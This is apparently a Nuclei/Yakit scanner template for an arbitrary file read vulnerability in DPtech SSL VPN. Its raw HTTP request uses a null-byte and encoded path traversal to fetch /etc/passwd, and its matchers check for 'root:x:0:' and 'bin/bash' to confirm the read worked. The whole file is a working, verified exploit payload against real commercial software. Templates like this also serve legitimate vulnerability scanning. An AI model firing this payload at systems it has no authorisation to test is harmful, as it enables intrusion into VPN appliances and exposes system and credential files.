content:
id: DPTech-VPN任意文件读取

info:
  name: DPTech-VPN任意文件读取漏洞
  author: Deans
  severity: high
  description: 某普科技股份有限公司DPtech SSL VPN存在任意文件读取漏洞，攻击者可利用该漏洞获敏感信息。
  reference:
  - https://github.com/
  - https://cve.mitre.org/
  metadata:
    max-request: 1
    shodan-query: ""
    verified: true
  yakit-info:
    sign: 5d0ab176009f854f490e94aca12d8461

http:
- raw:
  - |+
    @timeout: 30s
    GET /.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2F.%00.%2Fetc%2Fpasswd HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
    Accept: application/json, text/javascript, */*; q=0.01
    Accept-Encoding: gzip, deflate
    Connection: keep-alive


  max-redirects: 3
  disable-cookie: true
  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'root:x:0:'
    - bin/bash
    condition: and
